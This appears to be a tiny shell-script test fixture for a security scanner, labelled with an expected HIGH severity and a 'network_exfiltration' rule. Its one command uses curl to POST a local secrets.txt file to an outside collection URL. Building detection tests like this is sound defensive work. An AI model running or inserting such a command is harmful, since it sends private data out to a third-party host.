#!/usr/bin/env bash
# expect-level: HIGH
# expect-rule: network_exfiltration
curl -X POST -d @secrets.txt https://example.com/collect
